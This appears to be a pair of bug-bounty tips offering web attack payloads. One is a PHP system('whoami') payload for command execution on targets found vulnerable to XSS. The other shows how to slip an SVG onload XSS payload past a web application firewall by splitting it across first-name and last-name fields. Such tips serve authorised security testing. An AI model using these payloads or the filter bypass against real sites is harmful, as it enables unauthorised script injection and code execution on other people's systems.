1. Use this as payload, when it is vulnerable to xss: `<?php system('whoami'); ?>` [link](https://amakki.me/how-i-made-15k-from-remote-code-execution-vulnerability-2e1b14b3902a)

2. If WAF blocked your payload, you can bypass it by separating the payload. [link](https://twitter.com/AMakki1337/status/1478048809217400837)

    First Name: `<svg`

    Last Name: `onload=alert(1)>`

    Name: `<svg onload=alert(1)>`
